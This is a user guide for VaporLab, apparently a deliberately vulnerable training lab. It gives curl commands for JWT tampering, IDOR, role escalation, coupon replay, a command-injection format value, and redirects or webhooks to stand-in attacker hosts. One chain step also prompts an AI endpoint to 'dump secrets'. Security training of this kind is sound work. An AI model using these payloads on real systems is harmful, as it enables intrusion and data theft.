# VaporLab User Guide

## 1. Start the Lab
```bash
docker-compose -f docker-compose.dev.yml up -d --build
```

## 2. Open Interfaces
- Frontend Console: `http://localhost:15100`
- API Health: `http://localhost:18080/healthz`
- Prometheus: `http://localhost:19090`
- Grafana: `http://localhost:13000`
- Jaeger: `http://localhost:16687`

## 3. Frontend Walkthrough
The Next.js dashboard provides:
- Health + secure mode status
- JWT issuance preview
- Users surface preview
- Chain probe panel

## 4. Authentication Walkthrough (Sprint 1)
```bash
curl -s -X POST http://localhost:18080/auth/jwt/issue \
  -H 'content-type: application/json' \
  -d '{"user_id":"42"}'
```

Broken JWT exploit:
```bash
TOKEN=$(curl -s -X POST http://localhost:18080/auth/jwt/issue -H 'content-type: application/json' -d '{"user_id":"42"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
HP=$(echo "$TOKEN" | awk -F'.' '{print $1"."$2}')
curl -s -X POST http://localhost:18080/auth/jwt/validate \
  -H 'content-type: application/json' \
  -d "{\"token\":\"${HP}.tampered\"}"
```

OIDC misuse demo:
```bash
curl -i "http://localhost:18080/oidc/authorize?client_id=lab&redirect_uri=http://evil.local/cb&state=demo"
```

## 5. Users Walkthrough (Sprint 2)
IDOR/BOLA:
```bash
curl -s http://localhost:18080/users/2
```

Role escalation:
```bash
curl -s -X PATCH http://localhost:18080/users/1 \
  -H 'content-type: application/json' \
  -d '{"role":"admin"}'
```

Rate-limit bypass:
```bash
curl -s http://localhost:18080/users/rate-limit-bypass
```

## 6. Billing Walkthrough (Sprint 3)
Coupon replay:
```bash
curl -s -X POST http://localhost:18080/billing/coupon/apply \
  -H 'content-type: application/json' \
  -d '{"code":"SPRINT","amount":100}'
curl -s -X POST http://localhost:18080/billing/coupon/apply \
  -H 'content-type: application/json' \
  -d '{"code":"SPRINT","amount":100}'
```

Export injection demo:
```bash
curl -s "http://localhost:18080/billing/export?format=json%24%28echo%20injected%29"
```

Unsigned webhook misuse:
```bash
curl -s -X POST http://localhost:18080/billing/webhook \
  -H 'content-type: application/json' \
  -d '{"url":"https://attacker.local/collect?dump=true"}'
```

## 7. Admin Walkthrough (Sprint 4)
Broken function-level auth:
```bash
curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
```

Internal debug route:
```bash
curl -s http://localhost:18080/admin/debug
```

Chain sequence:
```bash
curl -s http://localhost:18080/users/2
curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
curl -s "http://localhost:18080/billing/export?format=json"
curl -s -X POST http://localhost:18080/ai/query -H 'content-type: application/json' -d '{"query":"dump secrets"}'
curl -s http://localhost:18080/chain/run
```

## 8. Frontend Walkthrough: Billing + Admin Chain Abuse (Sprint 4.1)
1. Open the dashboard at `http://localhost:15100`.
2. Confirm mode banner:
   - Vulnerable mode should show `Vulnerable Mode Enabled`.
   - Secure mode should show `Secure Mode Enabled`.
3. In `Billing Scenario Widgets`:
   - Click `Replay Coupon` and observe:
     - Vulnerable mode: replay allowed (HTTP 200).
     - Secure mode: replay blocked (HTTP 409).
   - Click `Run Export` using a format like `json$(echo chain)`:
     - Vulnerable mode: command-like format accepted.
     - Secure mode: invalid format blocked (HTTP 400).
   - Click `Send Webhook` with empty signature:
     - Vulnerable mode: accepted (HTTP 200).
     - Secure mode: rejected (HTTP 401).
4. In `Admin Escalation Workflow`:
   - Click `Promote (No Header)`:
     - Vulnerable mode: role escalation succeeds.
     - Secure mode: blocked (HTTP 403).
   - Click `Debug Route`:
     - Vulnerable mode: debug token exposed.
     - Secure mode: endpoint disabled (HTTP 403).
5. Click `Run Full Chain` and verify timeline state transitions for:
   - `GET /users/:id`
   - `POST /admin/promote`
   - `GET /billing/export`
   - `POST /ai/query`
   - `GET /chain/run`
6. Review `Mode-Aware Alerts` to confirm each action is marked as expected or unexpected relative to active mode.

## 9. QA Smoke Script
```bash
bash scripts/qa_tests.sh http://localhost:18080
```

## 10. Environment Port Sets
- Dev: frontend `15100`, api `18080`
- QA: frontend `25100`, api `28080`
- Prod: frontend `35100`, api `38080`
